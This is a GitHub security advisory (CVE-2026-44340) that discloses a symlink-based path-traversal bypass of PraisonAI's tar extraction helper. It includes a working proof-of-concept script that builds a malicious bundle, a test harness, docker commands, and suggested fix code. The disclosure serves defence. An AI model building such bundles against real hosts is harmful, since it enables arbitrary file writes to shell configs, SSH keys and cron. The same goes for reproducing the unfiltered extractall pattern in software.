<p>The <code>_safe_extractall</code> helper that all <code>recipe pull</code>, <code>recipe publish</code>, and <code>recipe unpack</code> flows route through validates each archive member's <code>name</code> for absolute paths, <code>..</code> segments, and resolved-path escape — but does <strong>not</strong> validate <code>member.linkname</code>, does not reject symlink/hardlink members, and calls <code>tar.extractall(dest_dir)</code> without <code>filter="data"</code>. A bundle that contains a symlink with a name
inside <code>dest_dir</code> but a <code>linkname</code> pointing outside it, followed by a regular file whose path traverses <em>through</em> the just-created symlink, escapes <code>dest_dir</code> and lets the attacker write arbitrary content to an attacker-chosen location on the victim's filesystem.</p>
<h2 id="affected-paths">Affected paths</h2>
<p>Every code path that calls <code>_safe_extractall</code> is exposed:</p>
<table>
<thead>
<tr>
<th>Caller</th>
<th>File:line</th>
</tr>
</thead>
<tbody><tr>
<td><code>praisonai recipe unpack</code></td>
<td><code>src/praisonai/praisonai/cli/features/recipe.py:1175</code> (introduced as the fix for GHSA-99g3-w8gr-x37c)</td>
</tr>
<tr>
<td><code>LocalRegistry.unpack</code> (recipe pull)</td>
<td><code>src/praisonai/praisonai/recipe/registry.py:413</code></td>
</tr>
<tr>
<td>Registry archive validation (publish)</td>
<td><code>src/praisonai/praisonai/recipe/registry.py:808</code></td>
</tr>
</tbody></table>
<h2 id="root-cause">Root cause</h2>
<p><code>recipe/registry.py:131-178</code>:</p>
<pre><code class="language-python">def _safe_extractall(tar: tarfile.TarFile, dest_dir: Path) -&gt; None:
    ...
    for member in tar.getmembers():
        ...
        member_path = Path(member.name)
        if member_path.is_absolute(): raise RegistryError(...)
        if '..' in member_path.parts: raise RegistryError(...)
        resolved = (dest_resolved / member_path).resolve()
        if not str(resolved).startswith(str(dest_resolved) + os.sep) and resolved != dest_resolved:
            raise RegistryError(...)
    # All members validated — safe to extract
    tar.extractall(dest_dir)
</code></pre>
<p>Three gaps:</p>
<ol>
<li>The loop checks only <code>member.name</code>. <code>member.linkname</code> (the symlink / hardlink target) is not inspected.</li>
<li><code>member.issym()</code> and <code>member.islnk()</code> are not used to refuse link members at all.</li>
<li><code>tar.extractall(dest_dir)</code> runs without <code>filter="data"</code>. On Python ≤ 3.13 the default is <code>fully_trusted</code> (with a DeprecationWarning on 3.12+), which permits symlinks pointing outside <code>dest_dir</code>.</li>
</ol>
<p>When the archive is extracted in member order, the symlink lands first, and any subsequent member whose path traverses through that symlink follows it to the attacker's chosen location.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Tested in a disposable container against <code>praisonai==4.6.35</code> (<code>pip install praisonai</code>, no other modifications).</p>
<p><code>make_bundle.py</code>:</p>
<pre><code class="language-python">import io, json, tarfile
manifest = json.dumps({"name": "legit", "version": "1.0.0"}).encode()
with tarfile.open("malicious.praison", "w:gz") as tar:
    info = tarfile.TarInfo("manifest.json"); info.size = len(manifest)
    tar.addfile(info, io.BytesIO(manifest))

    sym = tarfile.TarInfo("legit/escape")
    sym.type = tarfile.SYMTYPE
    sym.linkname = "/tmp/PWNED"
    tar.addfile(sym)

    payload = b"PWNED via symlink-extraction bypass of _safe_extractall\n"
    pf = tarfile.TarInfo("legit/escape/owned.txt"); pf.size = len(payload)
    tar.addfile(pf, io.BytesIO(payload))
</code></pre>
<p><code>direct_test.py</code>:</p>
<pre><code class="language-python">import shutil, tarfile
from pathlib import Path
from praisonai.recipe.registry import _safe_extractall

DEST = Path("/work/recipes_direct")
shutil.rmtree(DEST, ignore_errors=True); DEST.mkdir(parents=True)
Path("/tmp/PWNED").mkdir(parents=True, exist_ok=True)

with tarfile.open("malicious.praison", "r:gz") as tar:
    _safe_extractall(tar, DEST)

assert Path("/tmp/PWNED/owned.txt").exists(), "did not escape"
print("PWNED:", Path("/tmp/PWNED/owned.txt").read_text())
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">docker run --rm -v "$PWD:/work" -w /work python:3.11-slim sh -c '
  pip install -q praisonai &amp;&amp;
  python make_bundle.py &amp;&amp;
  python direct_test.py
'
</code></pre>
<p>Observed output:</p>
<pre><code>_safe_extractall returned cleanly
PWNED: PWNED via symlink-extraction bypass of _safe_extractall
</code></pre>
<p><code>/tmp/PWNED/owned.txt</code> exists after the call returns, written outside the destination directory the helper was asked to extract into.</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary file write with attacker-controlled content to an attacker-chosen path, on every host that processes a malicious <code>.praison</code> bundle through any of the three callers above.</p>
<p>Realistic exploitation paths:</p>
<ul>
<li>A user runs <code>praisonai recipe unpack ./&lt;malicious&gt;.praison</code> after obtaining the bundle from a shared registry, a tutorial link, or
direct messaging.</li>
<li>A user runs <code>praisonai recipe pull &lt;name&gt;</code> against a malicious or compromised registry.</li>
<li>A registry server processes an uploaded <code>.praison</code> bundle (the publish path is reachable over the network if the server is exposed. per GHSA-r9x3-wx45-2v7f and GHSA-2xgv-5cv2-47vv).</li>
</ul>
<p>Where the agent process runs as a regular user, the attacker can overwrite shell config (<code>.bashrc</code>, <code>.zshrc</code>, <code>.profile</code>), SSH <code>authorized_keys</code>, cron entries, or project files in adjacent directories. Where the process runs as root (registry-server deployments and some <code>sudo</code>-launched workflows), the attacker controls arbitrary system files.</p>
<p>This re-opens the <code>recipe pull</code>, <code>recipe publish</code>, and <code>recipe unpack</code> paths that GHSA-99g3-w8gr-x37c, GHSA-4rx4-4r3x-6534, GHSA-r9x3-wx45-2v7f, and GHSA-4ph2-f6pf-79wv were each intended to close.</p>
<h2 id="suggested-remediation">Suggested remediation</h2>
<p>Single-line fix at <code>recipe/registry.py:178</code>:</p>
<pre><code class="language-python">tar.extractall(dest_dir, filter="data")
</code></pre>
<p><code>filter="data"</code> (introduced in Python 3.12; available as a backport on 3.8+ via the official PEP 706 reference implementation) refuses
symlinks, hardlinks, device nodes, and absolute or escaping link targets, it is the canonical Python defense against this class.
If you also support older Python, add an explicit guard inside the existing per-member loop before <code>tar.extractall</code>:</p>
<pre><code class="language-python">if member.issym() or member.islnk():
    link_target = (dest_resolved / member_path.parent / member.linkname).resolve()
    if member.linkname.startswith("/") or not str(link_target).startswith(str(dest_resolved) + os.sep):
        raise RegistryError(
            f"Refusing to extract link with target outside dest dir: "
            f"{member.name} -&gt; {member.linkname}"
        )
</code></pre>
<h2 id="affected-versions">Affected versions</h2>
<p><code>praisonai &gt;= 2.7.2</code> through current <code>4.6.35</code> (the helper exists at least back to the earliest path-traversal patch chain referenced in
GHSA-99g3-w8gr-x37c). All releases that route extraction through <code>_safe_extractall</code> are exposed.</p>
<h2 id="disclosure">Disclosure</h2>
<p>Reported privately via the project's GHSA workflow at
<a href="https://github.com/MervinPraison/PraisonAI/security/advisories/new">https://github.com/MervinPraison/PraisonAI/security/advisories/new</a></p>
<p>-- Dhiral Vyas</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9q28-ghcr-c4x3">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9q28-ghcr-c4x3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44340">https://nvd.nist.gov/vuln/detail/CVE-2026-44340</a></li>
<li><a href="https://github.com/advisories/GHSA-9q28-ghcr-c4x3">https://github.com/advisories/GHSA-9q28-ghcr-c4x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q28-ghcr-c4x3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T13:59:41.000Z</published>
    </entry>
</feed>